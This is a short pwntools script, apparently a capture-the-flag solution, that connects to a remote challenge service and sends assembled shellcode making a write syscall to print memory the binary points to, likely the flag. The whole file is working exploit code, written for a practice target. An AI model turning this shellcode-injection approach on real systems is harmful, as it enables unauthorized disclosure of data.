from pwn import *

context.binary = exe = ELF('./chal')
#io = process()
#gdb.attach(io, api=True)
io = remote('amt.rs', 31174)

io.recvuntil(b'> ')
payload = asm("""mov rsi, rax
mov rdi, 1
mov rdx, 100
xor rax, rax
inc rax
syscall""")

io.sendline(payload)
io.interactive()